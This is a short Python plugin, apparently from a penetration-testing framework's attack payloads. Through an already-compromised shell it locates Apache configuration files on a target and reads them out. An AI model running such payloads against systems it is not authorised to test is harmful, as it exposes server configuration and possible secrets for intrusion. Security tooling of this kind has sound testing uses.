import re
from plugins.attack.payloads.base_payload import base_payload

class apache_config(base_payload):
    '''
    This payload displays content of Apache Configuration Files.
    '''
    def run_read(self):
        result = []
        files = []

        apache_config_files = self.exec_payload('apache_config_files')
        if apache_config_files:
            for file in apache_config_files:
                if self.shell.read(file):
                    result.append('------------------------- ')
                    result.append('FILE => '+file)
                    result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        if result == [ ]:
            result.append('Apache configuration files not found.')
        return result
